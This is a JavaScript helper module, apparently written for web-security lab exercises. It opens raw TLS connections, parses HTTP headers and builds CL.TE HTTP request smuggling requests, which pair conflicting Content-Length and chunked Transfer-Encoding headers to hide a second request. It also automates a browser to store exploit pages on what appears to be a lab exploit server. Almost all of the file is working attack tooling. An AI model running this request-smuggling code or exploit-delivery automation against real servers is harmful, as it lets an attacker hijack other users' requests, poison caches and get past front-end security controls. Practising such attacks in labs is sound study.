const tls = require('tls');

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function sendRawTlsRequest(host, request, readTimeoutMs = 1200) {
  const socket = tls.connect({
    host,
    port: 443,
    servername: host,
    ALPNProtocols: ['http/1.1'],
    rejectUnauthorized: true,
  });

  await new Promise((resolve, reject) => {
    socket.once('secureConnect', resolve);
    socket.once('error', reject);
  });

  socket.write(request);

  const chunks = [];
  await new Promise((resolve, reject) => {
    let timer = setTimeout(() => {
      socket.end();
      resolve();
    }, readTimeoutMs);

    const finish = () => {
      clearTimeout(timer);
      resolve();
    };

    socket.on('data', (chunk) => {
      chunks.push(chunk);
      clearTimeout(timer);
      timer = setTimeout(() => {
        socket.end();
        resolve();
      }, 250);
    });
    socket.once('end', finish);
    socket.once('close', finish);
    socket.once('error', (error) => {
      clearTimeout(timer);
      reject(error);
    });
  });

  return Buffer.concat(chunks).toString('latin1');
}

function parseHeaders(rawResponse) {
  const [head = ''] = rawResponse.split('\r\n\r\n');
  const lines = head.split('\r\n').filter(Boolean);
  const statusLine = lines.shift() || '';
  const headers = {};

  for (const line of lines) {
    const separator = line.indexOf(':');
    if (separator === -1) continue;
    const name = line.slice(0, separator).trim().toLowerCase();
    const value = line.slice(separator + 1).trim();
    headers[name] = value;
  }

  return { statusLine, headers };
}

function buildClTeSmuggleRequest(host, smuggledRequest) {
  const body = `0\r\n\r\n${smuggledRequest}`;
  return [
    'POST / HTTP/1.1',
    `Host: ${host}`,
    'Content-Type: application/x-www-form-urlencoded',
    `Content-Length: ${Buffer.byteLength(body, 'utf8')}`,
    'Transfer-Encoding: chunked',
    '',
    body,
  ].join('\r\n');
}

async function storeExploitFile(page, exploitUrl, responseFile, responseBody, contentType = 'text/html; charset=utf-8') {
  await page.goto(exploitUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  const responseHead = `HTTP/1.1 200 OK\nContent-Type: ${contentType}`;
  await page.locator('input[name="responseFile"]').fill(responseFile).catch(() => {});
  await page.locator('textarea[name="responseHead"], textarea').first().fill(responseHead).catch(() => {});
  await page.locator('textarea[name="responseBody"], #responseBody, textarea').last().fill(responseBody);
  await page.getByRole('button', { name: /store/i }).click().catch(async () => page.click('input[value="Store"]'));
  await page.waitForTimeout(1200);
}

module.exports = {
  buildClTeSmuggleRequest,
  parseHeaders,
  sendRawTlsRequest,
  sleep,
  storeExploitFile,
};
